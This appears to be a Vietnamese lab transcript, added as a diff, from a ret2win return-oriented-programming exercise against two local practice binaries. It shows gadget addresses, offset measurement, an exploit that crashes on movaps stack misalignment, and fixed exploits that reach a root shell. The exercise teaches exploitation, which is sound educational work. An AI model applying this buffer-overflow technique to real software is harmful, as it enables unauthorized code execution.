@@ -1,0 +1,61 @@
+=====================================================================
+Lab 3.3 - transcript (output THAT, chay tren server verify)
+Moi truong: Ubuntu 24.04.4 LTS, glibc 2.39, gcc 13.3.0
+ASLR: randomize_va_space = 2 (No PIE nen dia chi gadget/win co dinh)
+=====================================================================
+
+$ bash build.sh
+[*] built: callme keycheck
+
+---------------------------------------------------------------------
+Dia chi gadget va win (callme)
+---------------------------------------------------------------------
+$ ROPgadget --binary callme | grep -E ': pop rdi ; ret$|: ret$'
+0x0000000000401166 : pop rdi ; ret
+0x000000000040101a : ret
+$ nm callme | grep -E ' (win|pop_rdi_ret)$'
+0000000000401166 T pop_rdi_ret
+0000000000401168 T win
+
+---------------------------------------------------------------------
+Do offset bang cyclic (n=8) qua corefile
+---------------------------------------------------------------------
+$ python3 measure.py ./callme   'Du lieu:\n'
+./callme: offset_to_saved_RIP = 72  (popped bytes = b'jaaaaaaa')
+$ python3 measure.py ./keycheck 'code?\n'
+./keycheck: offset_to_saved_RIP = 88  (popped bytes = b'laaaaaaa')
+
+---------------------------------------------------------------------
+exp_callme_nostack.py (buoc 1: CO TINH quen can stack -> dinh bay movaps)
+---------------------------------------------------------------------
+$ python3 exp_callme_nostack.py
+[+] Starting local process './callme': pid ...
+[+] magic dung. Shell:
+# win() chay (in banner) nhung system("/bin/sh") crash. Soi core:
+
+$ # crash tai movaps, RSP lech 16 (glibc 2.39: system() di qua posix_spawn)
+signal           = 11 (SIGSEGV)
+crash rip        = libc_base + 0x5843b
+fault insn       = movaps %xmm0,0x50(%rsp)     # ngay truoc call posix_spawn
+
+---------------------------------------------------------------------
+exp_callme.py (buoc 2: them 1 gadget `ret` can stack 16 byte -> shell)
+---------------------------------------------------------------------
+$ python3 exp_callme.py
+[*] Loaded 6 cached gadgets for './callme'
+[+] Starting local process './callme': pid ...
+===SHELL_OK===
+uid=0(root) gid=0(root) groups=0(root)
+
+---------------------------------------------------------------------
+exploit.py (lab: keycheck, offset 88, pop rdi 0x1337c0de, ret can stack, win)
+---------------------------------------------------------------------
+$ python3 exploit.py
+[*] Loading gadgets for '.../keycheck'
+[+] Starting local process './keycheck': pid ...
+===SHELL_OK===
+uid=0(root) gid=0(root) groups=0(root)
+
+# KET QUA: callme va keycheck deu lay shell. Chi khac dung 1 phan tu `ret`
+# trong chain la tu crash (movaps) thanh shell - dung triệu chung "ham dich
+# chay roi chet ngay" de nhan ra loi can stack 16 byte.
